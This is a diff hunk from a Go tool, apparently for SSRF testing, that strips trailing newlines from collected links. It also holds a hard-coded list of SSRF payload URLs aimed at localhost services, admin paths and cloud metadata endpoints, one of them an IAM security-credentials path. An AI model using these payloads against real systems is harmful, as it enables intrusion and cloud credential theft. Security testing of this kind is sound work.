@@ -159,41 +159,41 @@ func search_for_links() []string {
 
 			// Check for internal domains in js
 			if strings.Contains("internal", matches[0]) {
-				links=append(links, matches[0] + "\n")
+				links=append(links, matches[0])
 			}
 			if strings.Contains("prod", matches[0]) {
-                                links=append(links, matches[0] + "\n")
+                                links=append(links, matches[0])
                         }
 			if strings.Contains("jira", matches[0]) {
-                                links=append(links, matches[0] + "\n")
+                                links=append(links, matches[0])
                         }
 			if strings.Contains("corp", matches[0]) {
-                                links=append(links, matches[0] + "\n")
+                                links=append(links, matches[0])
                         }
 			if strings.Contains("uat", matches[0]) {
-                                links=append(links, matches[0] + "\n")
+                                links=append(links, matches[0])
                         }
 		}
 	}
 
 	// Append some other payloads
-        links=append(links, "http://example.com" + "\n")
-        links=append(links, "http://127.0.0.1:80" + "\n")
-        links=append(links, "http://127.0.0.1:443" + "\n")
-        links=append(links, "http://127.0.0.1:22" + "\n")
-        links=append(links, "https://localhost/admin" + "\n")
-        links=append(links, "http://[::]:22/" + "\n")
-        links=append(links, "http://169.254.169.254" + "\n")
-        links=append(links, "http://169.254.169.254/computeMetadata/v1/" + "\n")
-      	links=append(links, "169.254.169.254/latest/meta-data/iam/security-credentials/flaws/" + "\n")
-	links=append(links, "example.com" + "\n")
-        links=append(links, "127.0.0.1:80" + "\n")
-        links=append(links, "169.254.169.254/computeMetadata/v1/" + "\n")
-        links=append(links, "127.0.0.1:443" + "\n")
-        links=append(links, "127.0.0.1:22" + "\n")
-        links=append(links, "localhost/admin" + "\n")
-        links=append(links, "169.254.169.254" + "\n")
-        links=append(links, "[::]:22/" + "\n")
+        links=append(links, "http://example.com")
+        links=append(links, "http://127.0.0.1:80")
+        links=append(links, "http://127.0.0.1:443")
+        links=append(links, "http://127.0.0.1:22")
+        links=append(links, "https://localhost/admin")
+        links=append(links, "http://[::]:22/")
+        links=append(links, "http://169.254.169.254")
+        links=append(links, "http://169.254.169.254/computeMetadata/v1/")
+      	links=append(links, "169.254.169.254/latest/meta-data/iam/security-credentials/flaws/")
+	links=append(links, "example.com")
+        links=append(links, "127.0.0.1:80")
+        links=append(links, "169.254.169.254/computeMetadata/v1/")
+        links=append(links, "127.0.0.1:443")
+        links=append(links, "127.0.0.1:22")
+        links=append(links, "localhost/admin")
+        links=append(links, "169.254.169.254")
+        links=append(links, "[::]:22/")
 
 	// Save the JS files.
 	save_to_file(jsFiles, " Saving JS Files for later use", "jsfiles.txt")
